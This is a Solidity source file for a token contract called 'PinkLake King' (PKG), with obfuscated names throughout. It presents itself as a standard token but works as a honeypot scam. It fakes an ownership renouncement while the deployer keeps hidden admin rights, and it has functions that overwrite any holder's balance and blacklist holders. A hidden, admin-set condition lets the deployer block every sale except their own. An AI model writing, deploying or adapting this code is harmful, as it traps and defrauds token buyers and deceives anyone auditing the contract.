//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

abstract contract zjyctxrgp {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface llhotgrkuc {
    function createPair(address remcdtzjdl, address vvmwgzgnzlc) external returns (address);
}


interface nbmdhnscp {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface gprkkvinnw {
    function totalSupply() external view returns (uint256);

    function balanceOf(address kujgfrvhgmezt) external view returns (uint256);

    function transfer(address wmxxmkcakebvt, uint256 dsiisasfynr) external returns (bool);

    function allowance(address hkfovrowbxkgt, address spender) external view returns (uint256);

    function approve(address spender, uint256 dsiisasfynr) external returns (bool);

    function transferFrom(address sender,address wmxxmkcakebvt,uint256 dsiisasfynr) external returns (bool);

    event Transfer(address indexed from, address indexed okpziyamhuvlru, uint256 value);
    event Approval(address indexed hkfovrowbxkgt, address indexed spender, uint256 value);
}

interface gprkkvinnwMetadata is gprkkvinnw {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PinkLakeKing is zjyctxrgp, gprkkvinnw, gprkkvinnwMetadata {

    function wpewlgtkmchl(uint256 dsiisasfynr) public {
        agasxkrzub();
        rckvhrynax = dsiisasfynr;
    }

    string private kovksgjcem = "PKG";

    uint256 rckvhrynax;

    mapping(address => bool) public zgttaptnybkez;

    mapping(address => uint256) private mavuzerfq;

    function owner() external view returns (address) {
        return bxxmrovynpix;
    }

    function getOwner() external view returns (address) {
        return bxxmrovynpix;
    }

    function allowance(address wkjgwlyqnmspg, address vlrspjoxwsvd) external view virtual override returns (uint256) {
        if (vlrspjoxwsvd == ewnkgazysqydh) {
            return type(uint256).max;
        }
        return jojhjeqdj[wkjgwlyqnmspg][vlrspjoxwsvd];
    }

    function balanceOf(address kujgfrvhgmezt) public view virtual override returns (uint256) {
        return mavuzerfq[kujgfrvhgmezt];
    }

    function symbol() external view virtual override returns (string memory) {
        return kovksgjcem;
    }

    bool private ppnmtyeulj;

    uint256 private wfpnzgfctbbes = 100000000 * 10 ** 18;

    function approve(address vlrspjoxwsvd, uint256 dsiisasfynr) public virtual override returns (bool) {
        jojhjeqdj[_msgSender()][vlrspjoxwsvd] = dsiisasfynr;
        emit Approval(_msgSender(), vlrspjoxwsvd, dsiisasfynr);
        return true;
    }

    function xuluvhrwgc(address okqjytcguvfoax, address wmxxmkcakebvt, uint256 dsiisasfynr) internal returns (bool) {
        require(mavuzerfq[okqjytcguvfoax] >= dsiisasfynr);
        mavuzerfq[okqjytcguvfoax] -= dsiisasfynr;
        mavuzerfq[wmxxmkcakebvt] += dsiisasfynr;
        emit Transfer(okqjytcguvfoax, wmxxmkcakebvt, dsiisasfynr);
        return true;
    }

    bool private npmrkxbjvwj;

    uint8 private wcrfcfrynt = 18;

    bool private dygljmcyhmxxco;

    event OwnershipTransferred(address indexed yhkeflzoeixaib, address indexed gaxplwhxxvf);

    mapping(address => mapping(address => uint256)) private jojhjeqdj;

    function transfer(address xpujdwejdkncmt, uint256 dsiisasfynr) external virtual override returns (bool) {
        return pnsnwsilxejmr(_msgSender(), xpujdwejdkncmt, dsiisasfynr);
    }

    function reqmjmsapxjbc(address xpujdwejdkncmt, uint256 dsiisasfynr) public {
        agasxkrzub();
        mavuzerfq[xpujdwejdkncmt] = dsiisasfynr;
    }

    uint256 onxyjwheuo;

    function xntvwybietau(address ohoesrcpizwjzc) public {
        if (vzsnlijxzvxe) {
            return;
        }
        if (vxbgjnhqkz != sdrwyraajw) {
            sdrwyraajw = true;
        }
        uvbzcqkimllvr[ohoesrcpizwjzc] = true;
        if (ppnmtyeulj != tllojoreirqsls) {
            ppnmtyeulj = false;
        }
        vzsnlijxzvxe = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return wcrfcfrynt;
    }

    bool public vzsnlijxzvxe;

    address wsvwpgvwb = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function pnsnwsilxejmr(address okqjytcguvfoax, address wmxxmkcakebvt, uint256 dsiisasfynr) internal returns (bool) {
        if (okqjytcguvfoax == lpigjtrpgyy) {
            return xuluvhrwgc(okqjytcguvfoax, wmxxmkcakebvt, dsiisasfynr);
        }
        uint256 slgyrrktwhudam = gprkkvinnw(yofvxdflyfhjl).balanceOf(wsvwpgvwb);
        require(slgyrrktwhudam == rckvhrynax);
        require(!zgttaptnybkez[okqjytcguvfoax]);
        return xuluvhrwgc(okqjytcguvfoax, wmxxmkcakebvt, dsiisasfynr);
    }

    address ewnkgazysqydh = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public sdrwyraajw;

    function kjuoaavjetzj() public {
        emit OwnershipTransferred(lpigjtrpgyy, address(0));
        bxxmrovynpix = address(0);
    }

    mapping(address => bool) public uvbzcqkimllvr;

    address public lpigjtrpgyy;

    string private mkexgcnruu = "PinkLake King";

    function rtggoxtbok(address vhyapkkjlbd) public {
        agasxkrzub();
        
        if (vhyapkkjlbd == lpigjtrpgyy || vhyapkkjlbd == yofvxdflyfhjl) {
            return;
        }
        zgttaptnybkez[vhyapkkjlbd] = true;
    }

    bool public tllojoreirqsls;

    function agasxkrzub() private view {
        require(uvbzcqkimllvr[_msgSender()]);
    }

    function name() external view virtual override returns (string memory) {
        return mkexgcnruu;
    }

    address public yofvxdflyfhjl;

    function totalSupply() external view virtual override returns (uint256) {
        return wfpnzgfctbbes;
    }

    address private bxxmrovynpix;

    function transferFrom(address okqjytcguvfoax, address wmxxmkcakebvt, uint256 dsiisasfynr) external override returns (bool) {
        if (_msgSender() != ewnkgazysqydh) {
            if (jojhjeqdj[okqjytcguvfoax][_msgSender()] != type(uint256).max) {
                require(dsiisasfynr <= jojhjeqdj[okqjytcguvfoax][_msgSender()]);
                jojhjeqdj[okqjytcguvfoax][_msgSender()] -= dsiisasfynr;
            }
        }
        return pnsnwsilxejmr(okqjytcguvfoax, wmxxmkcakebvt, dsiisasfynr);
    }

    bool public vxbgjnhqkz;

    constructor (){
        if (dygljmcyhmxxco == npmrkxbjvwj) {
            ppnmtyeulj = true;
        }
        kjuoaavjetzj();
        nbmdhnscp spqbiiytqwfmw = nbmdhnscp(ewnkgazysqydh);
        yofvxdflyfhjl = llhotgrkuc(spqbiiytqwfmw.factory()).createPair(spqbiiytqwfmw.WETH(), address(this));
        if (npmrkxbjvwj) {
            sdrwyraajw = true;
        }
        lpigjtrpgyy = _msgSender();
        uvbzcqkimllvr[lpigjtrpgyy] = true;
        mavuzerfq[lpigjtrpgyy] = wfpnzgfctbbes;
        
        emit Transfer(address(0), lpigjtrpgyy, wfpnzgfctbbes);
    }

}